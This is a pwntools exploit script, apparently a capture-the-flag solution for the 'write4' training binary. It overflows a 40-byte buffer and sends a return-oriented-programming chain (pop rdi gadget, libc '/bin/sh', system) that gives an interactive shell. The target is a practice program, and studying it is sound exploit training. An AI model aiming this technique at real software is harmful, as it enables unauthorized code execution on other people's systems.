from pwn import * 

p = process("./write4") 
elf = ELF("./write4") 
rop = ROP(elf) 

USEFUL_FUNC = elf.symbols['usefulFunction']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
SYSTEM      = elf.symbols['system']
BIN_SH  = next(p.libc.search("/bin/sh\x00")) # libc from the running process so we get the right address for "/bin/sh" (already relocated addr)

log.info("usefulFunction @  " + hex(USEFUL_FUNC)) # useless
log.info("system() @ " + hex(SYSTEM))
log.info("pop rdi;ret @ " + hex(POP_RDI))
log.info("'/bin/sh' @ " + hex(BIN_SH))

base = "A"*40
rop = base + p64(POP_RDI) + p64(BIN_SH) + p64(SYSTEM) 

p.sendline(rop)

p.interactive()
